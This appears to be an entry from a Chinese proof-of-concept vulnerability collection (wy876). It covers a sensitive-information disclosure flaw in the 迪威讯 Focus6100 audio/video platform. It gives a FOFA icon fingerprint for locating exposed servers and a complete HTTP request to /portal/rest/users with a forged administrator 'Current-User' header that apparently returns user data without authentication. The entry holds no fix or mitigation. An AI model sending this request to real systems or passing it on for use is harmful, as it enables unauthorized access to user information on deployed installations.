---
fofa: "web.icon=="
source: "wy876 漏洞文库"
---

# 迪威讯Focus6100音视频通讯平台存在敏感信息泄露漏洞

# 一、漏洞简介
迪威讯Focus6100音视频通讯平台存在敏感信息泄露漏洞

# 二、影响版本
+ 迪威讯Focus6100音视频通讯平台

# 三、资产测绘
+ fofa`web.icon=="bbc933535a6bfe478afb1fd0b3c470bf"`
+ 特征


# 四 、漏洞复现
```java
GET /portal/rest/users HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tgilgex06w0aebxb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
